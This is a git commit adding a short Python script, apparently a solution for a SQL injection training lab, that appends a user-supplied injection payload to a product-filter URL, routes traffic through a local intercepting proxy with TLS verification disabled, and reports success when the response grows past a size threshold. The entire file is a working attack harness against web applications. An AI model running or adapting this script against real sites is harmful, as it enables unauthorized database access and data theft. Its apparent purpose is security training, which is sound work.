9fee0b82273011550f3306bbd3db8a05a75b81ac
xXomg1337Xx <36389538+xXomg1337Xx@users.noreply.github.com>
2024-01-05 13:10:47 -0600

    Create SQLi_lab1.py

---
+++ SQLi_lab1.py
@@ -0,0 +1,34 @@
+import requests
+import sys
+import urllib3
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
+
+THRESHOLD_SIZE = 4783
+
+
+def exploit_sqli(url, payload):
+	uri = '/filter?category=Gifts'
+	r = requests.get(url + uri + payload, verify = False, proxies=proxies)
+
+	if len(r.content) > THRESHOLD_SIZE:
+		return True  # Injection likely successful
+	else:
+		return False  # Injection likely failed
+
+
+if __name__ == "__main__":
+	try:
+		url = sys.argv[1].strip()
+		payload = sys.argv[2].strip()
+	except IndexError:
+		print("[-] Usage %s <url> <payload>" % sys.argv[0])
+		print('[-] Example %s www.example.com "1=1"' % sys.argv[0])
+		sys.exit(-1)
+
+	if exploit_sqli(url,payload):
+		print("Injection Successful")
+	else:
+		print("[-] SQLi Failed")
+
